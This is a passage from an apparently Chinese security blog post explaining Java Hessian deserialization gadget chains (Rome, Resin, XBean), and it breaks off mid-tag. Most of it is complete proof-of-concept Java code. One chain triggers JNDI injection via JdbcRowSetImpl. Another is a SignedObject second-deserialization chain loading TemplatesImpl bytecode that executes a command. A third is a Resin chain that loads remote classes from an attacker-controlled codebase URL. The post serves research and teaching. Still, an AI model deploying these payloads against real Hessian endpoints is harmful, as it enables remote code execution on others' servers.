触发的链子都不能直接拿来用。</p><p>目前常见的 Hessian 利用链在 marshalsec 中共有如下五个：</p><ul><li>Rome</li><li>XBean</li><li>Resin</li><li>SpringPartiallyComparableAdvisorHolder</li><li>SpringAbstractBeanFactoryPointcutAdvisor</li></ul><h3 id="Rome链"><a href="#Rome链" class="headerlink" title="Rome链"></a>Rome链</h3><h4 id="jndi"><a href="#jndi" class="headerlink" title="jndi"></a>jndi</h4><p>Rome 的链核心是 ToStringBean，这个类的 toString 方法会调用他封装类的全部无参 getter 方法，所以可以借助 JdbcRowSetImpl#getDatabaseMetaData() 方法触发 JNDI 注入。<br>这也是Rome链的一种利用方式可以参考：<a href="https://www.yuque.com/yyjccc/pk74ko/frdd2euxldnyzm5h">https://www.yuque.com/yyjccc/pk74ko/frdd2euxldnyzm5h</a><br> 之前打的是TemplateImpl字节码加载，这里照样可以打JdbcRowSetImpl的jdni<br><strong>poc</strong></p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Object</span> <span class="token function">JNDI</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">SQLException</span> <span class="token punctuation">{</span><span class="token class-name">String</span> jndi<span class="token operator">=</span><span class="token string">"rmi://127.0.0.1:8085/WhVCFlBv"</span><span class="token punctuation">;</span><span class="token class-name">JdbcRowSetImpl</span> jdbcRowSet <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">JdbcRowSetImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>jdbcRowSet<span class="token punctuation">.</span><span class="token function">setDataSourceName</span><span class="token punctuation">(</span>jndi<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">ToStringBean</span> toStringBean <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ToStringBean</span><span class="token punctuation">(</span><span class="token class-name">JdbcRowSetImpl</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> jdbcRowSet<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">EqualsBean</span> equalsBean <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">EqualsBean</span><span class="token punctuation">(</span><span class="token class-name">ToStringBean</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> toStringBean<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">&gt;</span></span> hashMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>hashMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>equalsBean<span class="token punctuation">,</span><span class="token string">"123"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> hashMap<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h4 id="二次反序列化"><a href="#二次反序列化" class="headerlink" title="二次反序列化"></a>二次反序列化</h4><p>上面 Gadget 因为是 JNDI 需要出网，所以通常被认为限制很高，因此还需要找无需出网的利用方式。其中一个常见的方式是使用 java.security.SignedObject 进行二次反序列化。<br><img src="/img/24-6-7/34.png"><br>Hessian反序列化触发到SignedObject的getObject方法，在这里再触发原生反序列化，这里反序列化可以再封装一次Rome链</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Object</span> <span class="token class-name">TowUnSerialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> code <span class="token operator">=</span> <span class="token class-name">CodeFactory<span class="token punctuation">.</span>RuntimeExec</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> codes<span class="token operator">=</span><span class="token punctuation">{</span>code<span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token class-name">TemplatesImpl</span> templates<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">TemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">setValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span><span class="token string">"_tfactory"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">TransformerFactoryImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">setValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span><span class="token string">"_name"</span><span class="token punctuation">,</span><span class="token string">"Yyjccc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">setValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span><span class="token string">"_bytecodes"</span><span class="token punctuation">,</span>codes<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">setValue</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span><span class="token string">"_transletIndex"</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">ToStringBean</span> toStringBean<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ToStringBean</span><span class="token punctuation">(</span><span class="token class-name">Templates</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>templates<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">EqualsBean</span> equalsBean<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">EqualsBean</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span><span class="token string">"aaa"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">HashMap</span> hashMap<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>hashMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>equalsBean<span class="token punctuation">,</span><span class="token string">"aaa"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">setValue</span><span class="token punctuation">(</span>equalsBean<span class="token punctuation">,</span><span class="token string">"_beanClass"</span><span class="token punctuation">,</span><span class="token class-name">ToStringBean</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">setValue</span><span class="token punctuation">(</span>equalsBean<span class="token punctuation">,</span><span class="token string">"_obj"</span><span class="token punctuation">,</span>toStringBean<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//SignedObject</span><span class="token class-name">KeyPairGenerator</span> kpg <span class="token operator">=</span> <span class="token class-name">KeyPairGenerator</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"DSA"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>kpg<span class="token punctuation">.</span><span class="token function">initialize</span><span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">KeyPair</span> kp <span class="token operator">=</span> kpg<span class="token punctuation">.</span><span class="token function">generateKeyPair</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">SignedObject</span> signedObject <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SignedObject</span><span class="token punctuation">(</span>hashMap<span class="token punctuation">,</span> kp<span class="token punctuation">.</span><span class="token function">getPrivate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">Signature</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"DSA"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">ToStringBean</span> toStringBean_sign<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ToStringBean</span><span class="token punctuation">(</span><span class="token class-name">SignedObject</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>signedObject<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">EqualsBean</span> equalsBean_sign<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">EqualsBean</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span><span class="token string">"yyjccc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">HashMap</span> hashMap_sign<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>hashMap_sign<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>equalsBean_sign<span class="token punctuation">,</span><span class="token string">"aaa"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">setValue</span><span class="token punctuation">(</span>equalsBean_sign<span class="token punctuation">,</span><span class="token string">"_beanClass"</span><span class="token punctuation">,</span><span class="token class-name">ToStringBean</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">setValue</span><span class="token punctuation">(</span>equalsBean_sign<span class="token punctuation">,</span><span class="token string">"_obj"</span><span class="token punctuation">,</span>toStringBean_sign<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> hashMap_sign<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> serialize <span class="token operator">=</span> <span class="token class-name">HessianSerize</span><span class="token punctuation">.</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token class-name">TowUnSerialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Object</span> deserialize <span class="token operator">=</span> <span class="token class-name">HessianSerize</span><span class="token punctuation">.</span><span class="token function">deserialize</span><span class="token punctuation">(</span>serialize<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="Resin"><a href="#Resin" class="headerlink" title="Resin"></a>Resin</h3><p>Resin是一个轻量级的、高性能的开源Java应用服务器。它是由Caucho Technology开发的，旨在提供可靠的Web应用程序和服务的运行环境。和Tomcat一样是个服务器，它和hessian在一个group里，所以有一定的联系<br><strong>依赖</strong></p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>com.caucho<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>resin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>4.0.64<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span></code></pre><p>Resin 这条利用链的入口点实际上是 HashMap 对比两个对象时触发的 com.sun.org.apache.xpath.internal.objects.XString 的 equals 方法。<br>使用 XString 的 equals 方法触发 com.caucho.naming.QName 的 toSting 方法。<br><strong>调用栈</strong></p><pre class="language-none"><code class="language-none">NamingManager.getObjectFactoryFromReference() (javax.naming.spi)NamingManager.getObjectInstance() (javax.naming.spi)NamingManager.getContext() (javax.naming.spi)ContinuationContext.getTargetContext() (javax.naming.spi)ContinuationContext.composeName() (javax.naming.spi)   // 关键点QName.toString() (com.caucho.naming)     // 关键点XString.equals() (com.sun.org.apache.xpath.internal.objects)HashMap.putVal()HashMap.put()MapDeserializer.readMap()SerializerFactory.readMap()Hessian2Input.readObject()</code></pre><img src="/img/24-6-7/35.png">QName 实际上是 Resin 对上下文 Context 的一种封装，它的 toString 方法会调用其封装类的 composeName 方法获取复合上下文的名称。<img src="/img/24-6-7/36.png">这条利用链使用了 javax.naming.spi.ContinuationContext 类，其 composeName 方法调用 getTargetContext 方法，然后调用 NamingManager#getContext 方法传入其成员变量 CannotProceedException 的相关属性。<img src="/img/24-6-7/37.png">漏洞触发点在 NamingManager#getObjectInstance 方法，这个方法调用 VersionHelper 加载类并实例化。<img src="/img/24-6-7/38.png">加载时使用了 URLClassLoader 并指定了类名和 codebase。<img src="/img/24-6-7/39.png">这个逻辑就赋予了程序远程加载类的功能，也就是漏洞的最终利用点。回过头看看Reference对象是哪来的<img src="/img/24-6-7/40.png"><img src="/img/24-6-7/41.png">属性cpe进入了CannotProceedException的父类<img src="/img/24-6-7/42.png">因此控制cpe 的属性resolveObj为Reference对象，可以进行远程类加载<p><strong>equal方法触发</strong><br>还有一个问题，如何确保hashmap#put的时候会触发equals方法<br>但是根据HashMap中putVal方法的了解，要想到达equals方法的调用处，需要满足前面的几个if条件：</p><ul><li>(p = tab[i = (n - 1) &amp; hash]) == null</li><li>p.hash == hash</li></ul><p>其实这两个条件表达的意思一致，就是put进去的两个元素的hashcode要一致，这样才有资格到达equals方法处，第一个元素QName对象是需要利用的对象，固定不动，而XString是为了触发equals方法而构造的对象，对链的后半部分无影响，因此可以根据QName的hash来构造XString对象</p><ul><li>目标hash：QName中有hashCode方法，直接调用即可得到目标hash</li><li>如何构造能够影响XString的hash</li></ul><p>查看其hashCode方法<br><img src="/img/24-6-7/43.png"><br><img src="/img/24-6-7/44.png"><br>即将m_obj属性转换成字符串类型返回，最后调用String的hashCode方法进行hash计算，这里的m_obj即是实例化XString传入的参数<br>现在的关键点在于根据String类的hashCode逻辑，得到该方法的逆操作，即根据hash值得到对应的string，然后将其作为m_obj</p><p>看看String 的HashCode<br><img src="/img/24-6-7/45.png"><br>在逆向的时候需要考虑int类型溢出的问题<br>这里暂时不研究怎么逆向算等值HashCode的字符串</p><p>当然另外一种方法就是有SpringAOP依赖，<strong>使用HotSwappableTargetSource包装一下，就不用逆向算hashCode了</strong><br>直接copy网上代码：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> unhash <span class="token punctuation">(</span> <span class="token keyword">int</span> hash <span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">int</span> target <span class="token operator">=</span> hash<span class="token punctuation">;</span><span class="token class-name">StringBuilder</span> answer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> target <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">// String with hash of Integer.MIN_VALUE, 0x80000000</span>answer<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"\\u0915\\u0009\\u001e\\u000c\\u0002"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> target <span class="token operator">==</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token constant">MIN_VALUE</span> <span class="token punctuation">)</span><span class="token keyword">return</span> answer<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Find target without sign bit set</span>target <span class="token operator">=</span> target <span class="token operator">&amp;</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token constant">MAX_VALUE</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">unhash0</span><span class="token punctuation">(</span>answer<span class="token punctuation">,</span> target<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> answer<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">void</span> unhash0 <span class="token punctuation">(</span> <span class="token class-name">StringBuilder</span> partial<span class="token punctuation">,</span> <span class="token keyword">int</span> target <span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">int</span> div <span class="token operator">=</span> target <span class="token operator">/</span> <span class="token number">31</span><span class="token punctuation">;</span><span class="token keyword">int</span> rem <span class="token operator">=</span> target <span class="token operator">%</span> <span class="token number">31</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> div <span class="token operator">&lt;=</span> <span class="token class-name">Character</span><span class="token punctuation">.</span><span class="token constant">MAX_VALUE</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">if</span> <span class="token punctuation">(</span> div <span class="token operator">!=</span> <span class="token number">0</span> <span class="token punctuation">)</span>partial<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span> div<span class="token punctuation">)</span><span class="token punctuation">;</span>partial<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span> rem<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span><span class="token function">unhash0</span><span class="token punctuation">(</span>partial<span class="token punctuation">,</span> div<span class="token punctuation">)</span><span class="token punctuation">;</span>partial<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span> rem<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>注意：放入的字符串最好不要看起来对称（看似无规律）<br><strong>poc</strong></p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Object</span> <span class="token function">payload</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">,</span> <span class="token class-name">NoSuchMethodException</span><span class="token punctuation">,</span> <span class="token class-name">InvocationTargetException</span><span class="token punctuation">,</span> <span class="token class-name">InstantiationException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span><span class="token punctuation">,</span> <span class="token class-name">NoSuchFieldException</span> <span class="token punctuation">{</span><span class="token class-name">String</span> codebase<span class="token operator">=</span><span class="token string">"http://127.0.0.1:8085/"</span><span class="token punctuation">;</span><span class="token class-name">String</span> clazzName<span class="token operator">=</span><span class="token string">"HVzHJCkI"</span><span class="token punctuation">;</span><span class="token class-name">Reference</span> ref <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Reference</span><span class="token punctuation">(</span>clazzName<span class="token punctuation">,</span>clazzName<span class="token punctuation">,</span>codebase<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">CannotProceedException</span> cpe <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CannotProceedException</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> aClass <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"javax.naming.spi.ContinuationContext"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Constructor</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> declaredConstructor <span class="token operator">=</span> aClass<span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token class-name">CannotProceedException</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Hashtable</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>declaredConstructor<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Context</span> context <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Context</span><span class="token punctuation">)</span> declaredConstructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span>cpe<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Hashtable</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">QName</span> qName <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">QName</span><span class="token punctuation">(</span>context<span class="token punctuation">,</span><span class="token string">"abc"</span><span class="token punctuation">,</span><span class="token string">"edf"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">XString</span> x1 <span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">XString</span><span class="token punctuation">(</span><span class="token function">unhash</span><span class="token punctuation">(</span>qName<span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">&gt;</span></span> hashMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>hashMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>qName<span class="token punctuation">,</span><span class="token string">"aaa"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>hashMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>x1<span class="token punctuation">,</span><span class="token string">"bbb"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Reflect</span><span class="token punctuation">.</span><span class="token function">setValue</span><span class="token punctuation">(</span><span class="token class-name">NamingException</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>cpe<span class="token punctuation">,</span><span class="token string">"resolvedObj"</span><span class="token punctuation">,</span>ref<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> hashMap<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> unhash <span class="token punctuation">(</span> <span class="token keyword">int</span> hash <span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">int</span> target <span class="token operator">=</span> hash<span class="token punctuation">;</span><span class="token class-name">StringBuilder</span> answer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> target <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">// String with hash of Integer.MIN_VALUE, 0x80000000</span>answer<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">"\\u0915\\u0009\\u001e\\u000c\\u0002"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> target <span class="token operator">==</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token constant">MIN_VALUE</span> <span class="token punctuation">)</span><span class="token keyword">return</span> answer<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Find target without sign bit set</span>target <span class="token operator">=</span> target <span class="token operator">&amp;</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token constant">MAX_VALUE</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">unhash0</span><span class="token punctuation">(</span>answer<span class="token punctuation">,</span> target<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> answer<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">void</span> unhash0 <span class="token punctuation">(</span> <span class="token class-name">StringBuilder</span> partial<span class="token punctuation">,</span> <span class="token keyword">int</span> target <span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">int</span> div <span class="token operator">=</span> target <span class="token operator">/</span> <span class="token number">31</span><span class="token punctuation">;</span><span class="token keyword">int</span> rem <span class="token operator">=</span> target <span class="token operator">%</span> <span class="token number">31</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> div <span class="token operator">&lt;=</span> <span class="token class-name">Character</span><span class="token punctuation">.</span><span class="token constant">MAX_VALUE</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">if</span> <span class="token punctuation">(</span> div <span class="token operator">!=</span> <span class="token number">0</span> <span class="token punctuation">)</span>partial<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span> div<span class="token punctuation">)</span><span class="token punctuation">;</span>partial<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span> rem<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span><span class="token function">unhash0</span><span class="token punctuation">(</span>partial<span class="token punctuation">,</span> div<span class="token punctuation">)</span><span class="token punctuation">;</span>partial<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span> rem<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> serialize <span class="token operator">=</span> <span class="token class-name">HessianSerize</span><span class="token punctuation">.</span><span class="token function">serialize2</span><span class="token punctuation">(</span><span class="token function">payload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">HessianSerize</span><span class="token punctuation">.</span><span class="token function">deserialize</span><span class="token punctuation">(</span>serialize<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><img src="/img/24-6-7/46.png"><h3 id="XBean"><a href="#XBean" class="headerlink" title="XBean"></a>XBean</h3><p>XBean是Apache Geronimo的子项目，设计这个的目的是为了能为Geronimo的插件提供一种方便<br>快捷的配置方式（具体怎么方便快捷，看完全文便知）。后来，Xbean被更多的开源项目引用。例如：jetty、Activemq等等，同时xbean也提供了对spring的支持<br><strong>依赖</strong></p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.apache.xbean<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>xbean-naming<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>4.24<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span></code></pre><p><strong>调用栈</strong></p><pre 